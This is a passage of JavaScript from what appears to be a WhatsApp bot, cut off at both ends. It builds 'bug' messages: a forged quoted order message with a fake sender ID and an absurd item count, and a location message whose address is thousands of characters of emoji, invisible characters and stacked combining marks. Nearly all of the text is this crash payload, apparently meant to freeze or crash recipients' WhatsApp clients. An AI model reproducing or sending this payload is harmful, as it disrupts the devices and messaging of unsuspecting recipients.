ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `ʀᴀɴᴢ`,
    orderTitle: `combine`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logo1.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: 'ʀᴀɴᴢ々ɢᴇᴍ🔥',
						address: 'ꪶ𖣂ꫂʀᴀɴᴢ   🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̄̓